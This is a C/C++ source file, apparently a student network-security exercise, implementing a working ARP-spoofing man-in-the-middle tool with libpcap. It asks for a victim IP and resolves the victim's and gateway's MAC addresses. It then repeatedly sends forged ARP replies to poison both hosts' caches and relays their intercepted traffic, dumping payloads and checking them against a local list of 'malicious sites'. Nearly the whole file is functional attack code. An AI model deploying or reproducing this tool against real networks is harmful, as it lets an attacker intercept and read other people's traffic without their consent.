#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <iostream>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <sstream>
#include <fstream>
using namespace std;
/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

struct sniff_arp {
#define ARP_REQUEST 1   /* ARP Request             */
#define ARP_REPLY 2     /* ARP Reply               */
    u_int16_t htype;    /* Hardware Type         2  */
    u_int16_t ptype;    /* Protocol Type          2 */
    u_char hlen;        /* Hardware Address Length 1*/
    u_char plen;        /* Protocol Address Length 1*/
    u_int16_t oper;     /* Operation Code          2*/
    u_char sha[6];      /* Sender hardware address 6*/
 u_char  sip[4];      /* Sender IP address       4*/
    u_char tha[6];      /* Target hardware address6 6*/
 u_char tip[4];      /* Target IP address       4*/
};

u_char attacker_ip[4];

u_char attacker_mac[6];

u_char victim_ip[4];

u_char victim_mac[6];

u_char gateway_ip[4]; //={ 192,168,32,254};

u_char gateway_mac[6];

bool found=false;

bool isgateway=false;

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

bool Ismal_site(string convert);

string convert;
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

    int i;
    int gap;
    const u_char *ch;

    /* offset */
    printf("%05d   ", offset);

    /* hex */
    ch = payload;
    for(i = 0; i < len; i++) {
        printf("%02x ", *ch);
        ch++;
        /* print extra space after 8th byte for visual aid */
        if (i == 7)
            printf(" ");
    }
    /* print space to handle line less than 8 bytes */
    if (len < 8)
        printf(" ");

    /* fill hex gap with spaces if not full line */
    if (len < 16) {
        gap = 16 - len;
        for (i = 0; i < gap; i++) {
            printf("   ");
        }
    }
    printf("   ");

    /* ascii (if printable) */
    char* ch_temp=new char[len];
    int k=0;
    ch = payload;
    for(i = 0; i < len; i++) {
        if (isprint(*ch)){
            ch_temp[k]=(char)(*ch);
           printf("%c", *ch);
        }
        else
        {
            printf(".");
            k--;
        }
        ch++;
        k++;
    }
    convert=convert+ch_temp;
    delete[] ch_temp;
    printf("\n");


return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

    int len_rem = len;
    int line_width = 1514;			/* number of bytes per line */
    int line_len;
    int offset = 0;					/* zero-based offset counter */
    const u_char *ch = payload;

    if (len <= 0)
        return;

    /* data fits on one line */
    if (len <= line_width) {
        print_hex_ascii_line(ch, len, offset);
        return;
    }

    /* data spans multiple lines */
    for ( ;; ) {
        /* compute current line length */
        line_len = line_width % len_rem;
        /* print line */
        print_hex_ascii_line(ch, line_len, offset);
        /* compute total remaining */
        len_rem = len_rem - line_len;
        /* shift pointer to remaining bytes to print */
        ch = ch + line_len;
        /* add offset */
        offset = offset + line_width;
        /* check if we have line width chars or less */
        if (len_rem <= line_width) {
            /* print last line and get out */
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }

return;
}


void GetgatewayMAC(pcap_t* handle)
{

    isgateway=true;
    u_char packets[100];

        //detination mac
        packets[0]=0xFF;
        packets[1]=0xFF;
        packets[2]=0xFF;
        packets[3]=0xFF;
        packets[4]=0xFF;
        packets[5]=0xFF;
        //source mac
        packets[6]=attacker_mac[0];
        packets[7]=attacker_mac[1];
        packets[8]=attacker_mac[2];
        packets[9]=attacker_mac[3];
        packets[10]=attacker_mac[4];
        packets[11]=attacker_mac[5];
        // type = arp
        packets[12]=0x08;
        packets[13]=0x06;
        //data packet ************************************
        // hardware type =1 ethernet  (6 IEE 802)
        packets[14]=0x00;
        packets[15]=0x01;
        //protocol address type IPV4
        packets[16]=0x08;
        packets[17]=0x00;
        //hardware address length = mac size
        packets[18]=0x06;
        // protocol address length = ipv4 length
        packets[19]=0x04;
        // opcode 1 = request , 2= reply
        packets[20]=0x00;
        packets[21]=0x01;
        //my mac
        packets[22]=attacker_mac[0];
        packets[23]=attacker_mac[1];
        packets[24]=attacker_mac[2];
        packets[25]=attacker_mac[3];
        packets[26]=attacker_mac[4];
        packets[27]=attacker_mac[5];
        //my ip change to gate way
        packets[28]=attacker_ip[0];
        packets[29]=attacker_ip[1];
        packets[30]=attacker_ip[2];
        packets[31]=attacker_ip[3];
        //dest mac
        packets[32]=0;
        packets[33]=0;
        packets[34]=0;
        packets[35]=0;
        packets[36]=0;
        packets[37]=0;
        //dest ip
        packets[38]=gateway_ip[0];
        packets[39]=gateway_ip[1];
        packets[40]=gateway_ip[2];
        packets[41]=gateway_ip[3];

        for(int i=42;i<100;i++)
            packets[i]=0;

        for(int i=0;i<100;i++)
        pcap_sendpacket(handle,packets,60);

        pcap_loop(handle,5, got_packet, NULL);
}

int Getgateway()
{
    string gw;
    FILE *f;
    char line[100] , *p , *c, *g, *saveptr;
    int nRet=1;

    f = fopen("/proc/net/route" , "r");

    while(fgets(line , 100 , f))
    {
        p = strtok_r(line , " \t", &saveptr);
        c = strtok_r(NULL , " \t", &saveptr);
        g = strtok_r(NULL , " \t", &saveptr);

        if(p!=NULL && c!=NULL)
        {
            if(strcmp(c , "00000000") == 0)
            {
                //printf("Default interface is : %s \n" , p);
                if (g)
                {
                    char *pEnd;
                    int ng=strtol(g,&pEnd,16);
                    //ng=ntohl(ng);
                    struct in_addr addr;
                    addr.s_addr=ng;
                    gw=string( inet_ntoa(addr) );
                    nRet=0;
                    string first[4];



                    int k=0;
                     for(int i=0;i<gw.length();i++)
                     {

                         if(gw[i]=='.')
                         {
                             k++;
                             continue;
                         }
                         if(gw[i]>47 && gw[i] < 58 ) first[k]=first[k]+gw[i];

                     }


                     int n0=atoi(first[0].c_str());
                     int n1=atoi(first[1].c_str());
                     int n2=atoi(first[2].c_str());
                     int n3=atoi(first[3].c_str());
                     gateway_ip[0]=n0;
                     gateway_ip[1]=n1;
                     gateway_ip[2]=n2;
                     gateway_ip[3]=n3;

                    }
                break;
            }
        }
    }

    fclose(f);
    return nRet;

}



int getIPAddress()
{
    FILE *fp;
    char buff[256];
    fp = popen("ifconfig | grep inet", "r");
    fgets(buff, 255, fp);
    pclose(fp);


    string first[4];

   int k=0;
    for(int i=20;i<34;i++)
    {

        if(buff[i]=='.')
        {
            k++;
            continue;
        }
        if(buff[i]>47 && buff[i] < 58 ) first[k]=first[k]+buff[i];

    }
    int n0=atoi(first[0].c_str());
    int n1=atoi(first[1].c_str());
    int n2=atoi(first[2].c_str());
    int n3=atoi(first[3].c_str());
    attacker_ip[0]=n0;
    attacker_ip[1]=n1;
    attacker_ip[2]=n2;
    attacker_ip[3]=n3;

}

int getMacAddress()
{
    struct ifreq ifr;
      struct ifconf ifc;
      char buf[1024];
      int success = 0;

      int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
      if (sock == -1) { /* handle error*/ };

      ifc.ifc_len = sizeof(buf);
      ifc.ifc_buf = buf;
      if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

      struct ifreq* it = ifc.ifc_req;
      const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

      for (; it != end; ++it) {
          strcpy(ifr.ifr_name, it->ifr_name);
          if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
              if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                  if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                      success = 1;
                      break;
                  }
              }
          }
          else { /* handle error */ }
      }



      if (success) memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
}

void setting()
{
    Getgateway();
    getIPAddress();
    getMacAddress();

    cout<<"            < my interface >"<<endl;
    cout<<"#attacker ip address#"<<endl;
    for(int i=0;i<4;i++)
    {

        printf("%d ",attacker_ip[i]);

    }
    cout<<endl;
    cout<<"#attacker mac address#"<<endl;

    for(int i=0;i<6;i++)
    {
        printf("%02X ",attacker_mac[i]);

    }
    cout<<endl;
    cout<<"#gateway address#"<<endl;
    for(int i=0;i<4;i++)
    {

        printf("%d ",gateway_ip[i]);

    }

    cout<<endl;
    int temp[4];
    char tempp[16];
    cout<<"input victim's ip address(4) :";
    for(int i=0;i<4;i++)
        cin>>temp[i];

    for(int i=0;i<4;i++)
    victim_ip[i]=temp[i];

}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */


/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

    static int count = 1;                   /* packet counter */

    /* declare pointers to packet headers */
    const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */
    const char *payload;                    /* Packet payload */

    const struct sniff_arp *arp;            /*arp header */

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("\nPacket number %d:\n", count);
    count++;

    /* define ethernet header */
    ethernet = (struct sniff_ethernet*)(packet);

    cout<<"#ethernet header"<<endl;
    cout<<"sorce mac address: ";
    const u_char *ch=ethernet->ether_shost;
    for(int i = 0; i < 6; i++)
    {
        printf("%02x ", *ch);
        ch++;
    }
    cout<<endl;
    ch=ethernet->ether_dhost;
    cout<<"destination mac address: ";
    for(int i = 0; i < 6; i++)
    {
        printf("%02x ", *ch);
       ch++;
    }
        cout<<endl;
        /* define/compute ip header offset */

      cout<<"####arp###"<<endl;
        arp = (struct sniff_arp*)(packet + SIZE_ETHERNET);


        printf("Hardware type: %s\n", (ntohs(arp->htype) == 1) ? "Ethernet" : "Unknown");
        printf("Protocol type: %s\n", (ntohs(arp->ptype) == 0x0800) ? "IPv4" : "Unknown");
        printf("Operation: %s\n", (ntohs(arp->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply");

        if(ntohs(arp->oper) == ARP_REPLY)
         {
              if(arp->tip[3]==attacker_ip[3] && arp->tip[2]==attacker_ip[2] && isgateway==false)
                           {
                               printf(" ####victim mac address get! #### \n");
                               for(int i=0; i<6;i++)
                               {
                                   printf("%02X:", arp->sha[i]);
                                    victim_mac[i]=arp->sha[i];

                               }
                               found=true;
                               return;

                           }
              else if(arp->tip[3]==attacker_ip[3] && arp->tip[2]==attacker_ip[2] && isgateway==true && (arp->sip[3]!=victim_ip[3]))
              {
                  printf(" @@@ gateway mac address get! @@@ \n");
                  for(int i=0; i<6;i++)
                  {
                      printf("%02X:", arp->sha[i]);
                       gateway_mac[i]=arp->sha[i];
                  }
                  found=true;
                  return;
              }
         }
        printf(" sender mac:  ");
        for(int i=0; i<6;i++)
               printf("%02X:", arp->sha[i]);
    cout<<endl;
        printf(" sender ip: ");
        for(int i=0; i<4;i++)
              printf("%d.", arp->sip[i]);

        printf("\nTarget MAC: ");

           for(int i=0; i<6;i++)
               printf("%02X:", arp->tha[i]);

           printf("\nTarget IP: ");

           for(int i=0; i<4; i++)
               printf("%d.", arp->tip[i]);




    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }

    char* src;
    inet_ntop(AF_INET,&ip->ip_src,src,INET_ADDRSTRLEN);
    char* dst;
    inet_ntop(AF_INET,&ip->ip_src,dst,INET_ADDRSTRLEN);
    /* print source and destination IP addresses */
    printf("       From: %s\n", src);
    printf("         To: %s\n", dst);

    /* determine protocol */
    switch(ip->ip_p) {
        case IPPROTO_TCP:
            printf("   Protocol: TCP\n");
            break;
        case IPPROTO_UDP:
            printf("   Protocol: UDP\n");
            return;
        case IPPROTO_ICMP:
            printf("   Protocol: ICMP\n");
            return;
            printf("   Dst port: %d\n", ntohs(tcp->th_dport));

        case IPPROTO_IP:
            printf("   Protocol: IP\n");
            return;
        default:
            printf("   Protocol: unknown\n");
            return;
    }

    /*
     *  OK, this packet is TCP.
     */

    /* define/compute tcp header offset */
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if (size_tcp < 20) {
        printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
        return;
    }

    printf("   Src port: %d\n", ntohs(tcp->th_sport));
    printf("   Dst port: %d\n", ntohs(tcp->th_dport));


    /*
     *
        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
     * payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
     * Print payload data; it might be binary, so don't just
     * treat it as a string.
    if (size_payload > 0) {
        printf("   Payload (%d bytes):\n", size_payload);
        print_payload(payload, size_payload);
    }
     */

 return;
}
bool keep=true;
void* send_both(void* data)
{
    char *dev = NULL;			/* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
    pcap_t *handle;				/* packet capture handle */

    char filter_exp[] = "arp";		/* filter expression [3] */
    struct bpf_program fp;			/* compiled filter program (expression) */
    bpf_u_int32 mask;			/* subnet mask */
    bpf_u_int32 net;			/* ip */

        /* find a capture device if not specified on command-line */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n",
                errbuf);
            exit(EXIT_FAILURE);
        }


    /* get network number and mask associated with capture device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
            dev, errbuf);
        net = 0;
        mask = 0;
    }

    /* open capture device */
    handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* make sure we're capturing on an Ethernet device [2] */
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "%s is not an Ethernet\n", dev);
        exit(EXIT_FAILURE);
    }

    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }



    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }


    cout<<"$$$$$$$$$$$$$sending a arp posion packet$$$$$$$$$$$$$$$"<<endl;
    u_char packets[100];

        //detination mac
        packets[0]=victim_mac[0];;
        packets[1]=victim_mac[1];;
        packets[2]=victim_mac[2];;
        packets[3]=victim_mac[3];;
        packets[4]=victim_mac[4];;
        packets[5]=victim_mac[5];;
        //source mac
        packets[6]=attacker_mac[0];
        packets[7]=attacker_mac[1];
        packets[8]=attacker_mac[2];
        packets[9]=attacker_mac[3];
        packets[10]=attacker_mac[4];
        packets[11]=attacker_mac[5];
        // type = arp
        packets[12]=0x08;
        packets[13]=0x06;
        //data packet ************************************
        // hardware type =1 ethernet  (6 IEE 802)
        packets[14]=0x00;
        packets[15]=0x01;
        //protocol address type IPV4
        packets[16]=0x08;
        packets[17]=0x00;
        //hardware address length = mac size
        packets[18]=0x06;
        // protocol address length = ipv4 length
        packets[19]=0x04;
        // opcode 1 = request , 2= reply
        packets[20]=0x00;
        packets[21]=0x02;
        //my mac
        packets[22]=attacker_mac[0];
        packets[23]=attacker_mac[1];
        packets[24]=attacker_mac[2];
        packets[25]=attacker_mac[3];
        packets[26]=attacker_mac[4];
        packets[27]=attacker_mac[5];
        //my ip change to gate way
        packets[28]=gateway_ip[0];
        packets[29]=gateway_ip[1];
        packets[30]=gateway_ip[2];
        packets[31]=gateway_ip[3];
        //dest mac
        packets[32]=victim_mac[0];
        packets[33]=victim_mac[1];
        packets[34]=victim_mac[2];
        packets[35]=victim_mac[3];
        packets[36]=victim_mac[4];
        packets[37]=victim_mac[5];
        //dest ip
        packets[38]=victim_ip[0];
        packets[39]=victim_ip[1];
        packets[40]=victim_ip[2];
        packets[41]=victim_ip[3];

        for(int i=42; i<100;i++)
            packets[i]=0;

        u_char packets_gw[100];
        memcpy(packets_gw,packets,100);
        //change dst mac (ethernet)
        packets_gw[0]=gateway_mac[0];;
        packets_gw[1]=gateway_mac[1];;
        packets_gw[2]=gateway_mac[2];;
        packets_gw[3]=gateway_mac[3];;
        packets_gw[4]=gateway_mac[4];;
        packets_gw[5]=gateway_mac[5];

        //change my ip to victim ip
        packets_gw[28]=victim_ip[0];
        packets_gw[29]=victim_ip[1];
        packets_gw[30]=victim_ip[2];
        packets_gw[31]=victim_ip[3];

        //dst mac
        packets_gw[32]=gateway_mac[0];
        packets_gw[33]=gateway_mac[1];
        packets_gw[34]=gateway_mac[2];
        packets_gw[35]=gateway_mac[3];
        packets_gw[36]=gateway_mac[4];
        packets_gw[37]=gateway_mac[5];
        //dst ip
        packets_gw[38]=gateway_ip[0];
        packets_gw[39]=gateway_ip[1];
        packets_gw[40]=gateway_ip[2];
        packets_gw[41]=gateway_ip[3];


       while(keep==true)
        {

            pcap_sendpacket(handle,packets,60);
            pcap_sendpacket(handle,packets_gw,60);
            cout<<"sending arp both victim and gateway( if you want to stop, enter anything )!!"<<endl;
            sleep(2);
        }

       pcap_freecode(&fp);

       pcap_close(handle);

}

void* relaying(void* data)
{
    char *dev = NULL;			/* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
    pcap_t *handle;				/* packet capture handle */
    struct pcap_pkthdr* header;	/* The header that pcap gives us */
    char filter_exp[] = "http";		/* filter expression [3] */
    struct bpf_program fp;			/* compiled filter program (expression) */
    bpf_u_int32 mask;			/* subnet mask */
    bpf_u_int32 net;			/* ip */
    const u_char* packet;
        /* find a capture device if not specified on command-line */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n",
                errbuf);
            exit(EXIT_FAILURE);
        }
    /* get network number and mask associated with capture device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
            dev, errbuf);
        net = 0;
        mask = 0;
    }
    /* open capture device */
    handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }
    /* make sure we're capturing on an Ethernet device [2] */
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "%s is not an Ethernet\n", dev);
        exit(EXIT_FAILURE);
    }
    /*
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }
    */
    while(keep==true)
    {

        cout<<"relaying"<<endl;
        int isnull=pcap_next_ex(handle, &header,&packet);
        if(isnull <=0)
        continue;

        //cout<<packet<<endl;

        const u_char* cp;
        cp=packet;

        const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */

        ethernet = (struct sniff_ethernet*)(packet);
        bool same_victim;
        bool same_gateway;
        for(int i=0;i<6;i++)
        {

        if(ethernet->ether_shost[i]==victim_mac[i]) same_victim=true;
        else
            {
            same_victim=false;
            break;
            }
        }

        for(int i=0;i<6;i++)
        {
         if(ethernet->ether_shost[i]==gateway_mac[i]) same_gateway=true;
         else
         {
          same_gateway=false;
          break;
         }
        }
        if(same_victim ==true ) //packet from victim
        {
            u_char* temp;
            u_char Togateway[12];

            /*source mac */
            for(int i=0;i<6;i++)
            Togateway[i]= gateway_mac[i];

            for(int i=6;i<12;i++)
            Togateway[i] = attacker_mac[i-6];

            temp = (u_char*)packet;

            cout<<"*****************************************"<<endl;

            cout<<"<modifying packet>"<<endl;
            for(int i=0;i<12;i++)
            printf("%02X",Togateway[i]);
            cout<<endl;
            convert.clear();

            cout<<"<original packet>"<<endl;
            print_payload(temp,header->len);

           cout<<"FUCKY"<<endl;
           cout<<convert<<endl;
           cout<< Ismal_site(convert);
            convert.clear();
            memmove(temp,Togateway,12);

            cout<<endl;
            pcap_sendpacket(handle,temp,header->len);

        }
        else if(same_gateway==true )
        {

            u_char Tovictim[12];

            /*source mac */
            for(int i=0;i<6;i++)
            Tovictim[i]= victim_mac[i];

            for(int i=6;i<12;i++)
            Tovictim[i] = attacker_mac[i-6];

            cout<<"<!!!            modifying packet(gateway)        !!! >"<<endl;
            for(int i=0;i<12;i++)
            printf("%02X",Tovictim[i]);
            cout<<endl;

            u_char* temp = (u_char*)packet;

            cout<<"<original packet>"<<endl;
            print_payload(temp,header->len);

            memmove(temp,Tovictim,12);
            cout<<endl;

            pcap_sendpacket(handle,temp,header->len);

        }

     }

    pcap_freecode(&fp);

    pcap_close(handle);

}

bool Ismal_site(string convert)
{
    FILE *f;
    char line[200][100];
    int i=0;






    if( (f = fopen("/home/jang/mal_site/mal_site.txt" , "r"))==NULL)
      {
        cout<<"error"<<endl;
        exit(0);
        }


    while(fgets(line[i] , 100 , f))
    {

       for(int p=0;p<100;p++)
       {
           if(line[i][p]=='\n')
           {
               line[i][p]='\0';
           }
       }

        i++;
    }
     fclose(f);

    for(int k=0;k<i;k++)
    {
        if(convert.find(line[k]) != string::npos)
        {
            FILE *fd;
            if( (fd=fopen("/home/jang/mal_site/log.txt","w")) ==NULL )
                    cout<<"file open error"<<endl;
            cout<<"                     it is mal_site"<<endl;
            fprintf(fd,"visit:");
            fprintf(fd,"%s\n",line[k]);
            fclose(fd);
             return true;
        }
    }

    return false;

}

int main(int argc, char **argv)
{


    setting();
    char *dev = NULL;			/* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
    pcap_t *handle;				/* packet capture handle */

    char filter_exp[] = "arp";		/* filter expression [3] */
    struct bpf_program fp;			/* compiled filter program (expression) */
    bpf_u_int32 mask;			/* subnet mask */
    bpf_u_int32 net;			/* ip */
    int num_packets = 5;			/* number of packets to capture */

    int thr_id;
    int thr_id2;
    pthread_t p_thread;
    pthread_t p_thread2;



    /* check for capture device name on command-line */
    if (argc == 2) {
        dev = argv[1];
    }
    else if (argc > 2) {
        fprintf(stderr, "error: unrecognized command-line options\n\n");

        exit(EXIT_FAILURE);
    }
    else {
        /* find a capture device if not specified on command-line */
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n",
                errbuf);
            exit(EXIT_FAILURE);
        }
    }

    /* get network number and mask associated with capture device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
            dev, errbuf);
        net = 0;
        mask = 0;
    }

    /* print capture info */
    printf("Device: %s\n", dev);
    printf("Number of packets: %d\n", num_packets);
    printf("Filter expression: %s\n", filter_exp);

    /* open capture device */
    handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* make sure we're capturing on an Ethernet device [2] */
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "%s is not an Ethernet\n", dev);
        exit(EXIT_FAILURE);
    }

    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }



    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n",
            filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }


    u_char packets[100];

        //detination mac
        packets[0]=0xFF;
        packets[1]=0xFF;
        packets[2]=0xFF;
        packets[3]=0xFF;
        packets[4]=0xFF;
        packets[5]=0xFF;

        /*
         * packets[0]=0x48;
        packets[1]=0x45;
        packets[2]=0x20;
        packets[3]=0x3E;
        packets[4]=0x02;
        packets[5]=0x3D;
         *  set mac source tomy mac
*/
        packets[6]=attacker_mac[0];
        packets[7]=attacker_mac[1];
        packets[8]=attacker_mac[2];
        packets[9]=attacker_mac[3];
        packets[10]=attacker_mac[4];
        packets[11]=attacker_mac[5];
        // type = arp
        packets[12]=0x08;
        packets[13]=0x06;
        //data packet ************************************
        // hardware type =1 ethernet  (6 IEE 802)
        packets[14]=0x00;
        packets[15]=0x01;
        //protocol address type IPV4
        packets[16]=0x08;
        packets[17]=0x00;
        //hardware address length = mac size
        packets[18]=0x06;
        // protocol address length = ipv4 length
        packets[19]=0x04;
        // opcode 1 = request , 2= reply
        packets[20]=0x00;
        packets[21]=0x01;
        //my mac
        packets[22]=attacker_mac[0];
        packets[23]=attacker_mac[1];
        packets[24]=attacker_mac[2];
        packets[25]=attacker_mac[3];
        packets[26]=attacker_mac[4];
        packets[27]=attacker_mac[5];
        //my ip
        packets[28]=attacker_ip[0];
        packets[29]=attacker_ip[1];
        packets[30]=attacker_ip[2];
        packets[31]=attacker_ip[3];
        //dest mac
        packets[32]=0;
        packets[33]=0;
        packets[34]=0;
        packets[35]=0;
        packets[36]=0;
        packets[37]=0;
        //dest ip
        packets[38]=victim_ip[0];
        packets[39]=victim_ip[1];
        packets[40]=victim_ip[2];
        packets[41]=victim_ip[3];

        for(int i=42; i<100;i++)
            packets[i]=0;

        for(int i=0;i<5;i++)
        pcap_sendpacket(handle,packets,60);


        /* now we can set our callback function */
        pcap_loop(handle, num_packets, got_packet, NULL);

       if(found==true)  // there is victim's host
       {
           GetgatewayMAC(handle);   //getting mac

           cout<<"sending arp infection"<<endl;
           thr_id=pthread_create(&p_thread,NULL,send_both,NULL);
           thr_id2=pthread_create(&p_thread2,NULL,relaying,NULL);
           cout<<"stop?"<<endl;
           int i=0;
           cin>>i;
           keep=false;
       }
       else
       {
           cout<<" no such ip and mac "<<endl;
       }
        /* cleanup */
        pcap_freecode(&fp);

        pcap_close(handle);


return 0;
}
